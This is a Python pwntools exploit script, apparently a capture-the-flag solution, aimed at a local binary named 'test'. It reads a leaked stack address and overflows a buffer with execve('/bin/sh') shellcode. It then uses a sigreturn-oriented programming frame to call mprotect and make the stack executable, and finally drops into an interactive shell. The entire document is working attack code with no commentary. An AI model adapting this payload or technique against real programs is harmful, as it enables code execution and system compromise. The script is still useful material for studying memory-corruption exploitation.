from pwn import *

target = process("./test")

syscall = 0x000000000040113a
mov =0x0000000000401144
context.arch = "amd64"
frame = SigreturnFrame()

target.recvuntil("@")
leak = int(target.recvuntil(",")[:-1:], 16)
stack_base = leak & 0xfffffffffffff000
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print(hex(leak))
print(hex(stack_base))
payload = shellcode + p64(leak + 0x10)*2  +  "a" * (104 - len(shellcode)) + p64(mov)
payload += p64(syscall)

frame.rax = 10
frame.rdi = stack_base
frame.rsi = 1000
frame.rdx = 7
frame.rip = syscall
frame.rsp = leak + len(payload) + 248

payload += str(frame)
payload += p64(leak)
target.sendline(payload)
target.interactive()

